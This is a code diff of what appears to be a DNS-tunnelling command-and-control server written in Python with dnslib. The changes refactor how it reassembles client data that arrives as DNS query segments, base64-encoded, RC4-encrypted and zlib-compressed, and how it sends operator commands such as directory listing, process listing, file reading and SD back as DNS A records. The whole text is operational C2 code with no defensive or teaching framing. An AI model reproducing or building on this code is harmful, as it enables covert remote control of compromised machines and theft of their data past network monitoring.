@@ -1,4 +1,5 @@
 import datetime
+import re
 import signal
 import sys
 import threading
@@ -9,7 +10,7 @@ from typing import Any, Dict
 
 from dnslib import *
 
-from shared import client_to_serv, serv_to_client
+from shared import client_to_serv, serv_to_client, get_request_name
 
 
 class Command:
@@ -28,7 +29,7 @@ class Command:
     def start(self):
         self.completed = False
         self.started = True
-        self.segments.clear()
+        self.segments = []
 
     def add_segment(self, data):
         self.segments.append(data)
@@ -76,7 +77,8 @@ class Server:
                 self.__log("No valid input...")
                 continue
 
-            self.__log("{}: Got request: {}".format(addr, request.get_q().get_qname()))
+            n = get_request_name(request.get_q().get_qname())
+            self.__log("{}: Got request: {}".format(addr, n))
             if request.get_q().get_qname().matchGlob(client_to_serv["HB"]):
                 # It is a heartbeat..
                 self.__log("{}: Heartbeat".format(addr))
@@ -120,25 +122,20 @@ class Server:
 
         return repl
 
-    def from_segment(self, data):
-        """
-        returns parsed data from segment
-        """
-
-        return "".join(data.rstrip(client_to_serv["RESP"]).split('.'))
-
     def decrypt_segments(self, addr) -> bool:
         """
         Attempts to decrypt segments
         :return: Whether the decryption was successful
         """
         try:
-            uncompressed = bytes("".join(self.commands_for_clients[addr].segments), "utf-8")
-            uncompressed = uncompressed.replace(b"_", b"/").replace(b"-", b"+")
-            uncompressed += b"=" * ((4 - len(uncompressed) % 4) % 4)
-            uncompressed = base64.b64decode(uncompressed)
-            uncompressed = ARC4(self.password).decrypt(uncompressed)
-            uncompressed = zlib.decompress(uncompressed)
+            segments_edited = [(re.sub("{}\.$".format(client_to_serv["RESP"]), "", i).replace(".", ""))
+                               for i in self.commands_for_clients[addr].segments]
+            flattened = bytes("".join(segments_edited), "utf-8")
+            flattened_replaced = flattened.replace(b"_", b"/").replace(b"-", b"+")
+            replaced_padded = flattened_replaced + b"=" * ((4 - len(flattened_replaced) % 4) % 4)
+            decoded = base64.b64decode(replaced_padded)
+            deciphered = ARC4(self.password).decrypt(decoded)
+            uncompressed = zlib.decompress(deciphered)
             self.commands_for_clients[addr].segments = uncompressed.decode("utf-8")
         except Exception as e:
             print("Error while processing data from {}: {}".format(addr, e))
@@ -153,9 +150,7 @@ class Server:
             self.__log("{}: Got data segment for command: {}".format(addr, self.commands_for_clients[addr].command))
 
             qname = str(request.get_q().get_qname())
-            qname = qname.rstrip(client_to_serv["RESP"])
-
-            self.commands_for_clients[addr].add_segment(self.from_segment(qname))
+            self.commands_for_clients[addr].add_segment(qname)
 
             command = serv_to_client["ACK"]
 
@@ -171,11 +166,11 @@ class Server:
             # We register a new client
             print("New client {} registered!".format(addr))
             self.commands_for_clients[addr] = Command(addr)
-            command = serv_to_client["ACK"]
+            command = "ACK"
 
         elif self.commands_for_clients[addr].completed:
             # We do not have any commands for this machine
-            command = serv_to_client["NOP"]
+            command = "NOP"
 
         else:
             # We have job for you!
@@ -184,7 +179,7 @@ class Server:
                     "{}: ERROR: The client has sent us a Heartbeat, while it was supposed to send a reply!".format(
                         addr))
                 self.commands_for_clients[addr].started = False
-                command = serv_to_client["RST"]
+                command = "RST"
             else:
                 self.commands_for_clients[addr].start()
                 command = self.commands_for_clients[addr].command
@@ -195,8 +190,8 @@ class Server:
             return
 
         reply = request.reply()
-        reply.add_answer(RR(client_to_serv["HB"], QTYPE.A, rdata=A(command), ttl=60))
         self.__log("{}: Sending {} command...".format(addr, command))
+        reply.add_answer(RR(client_to_serv["HB"], QTYPE.A, rdata=A(serv_to_client[command]), ttl=60))
         return reply
 
     def cleanup_connected(self):
@@ -260,18 +255,18 @@ class Server:
             argument = None
 
             if command == 1:
-                command = serv_to_client["LS"]
+                command = "LS"
             elif command == 2:
-                command = serv_to_client["W"]
+                command = "W"
             elif command == 3:
-                command = serv_to_client["PS"]
+                command = "PS"
             elif command == 4:
-                command = serv_to_client["CAT"]
+                command = "CAT"
                 argument = input("Enter argument: ")
             elif command == 5:
                 return
             elif command == 6:
-                command = serv_to_client["SD"]
+                command = "SD"
                 argument = input("Enter argument: ")
             elif command == 7:
                 self.running = False
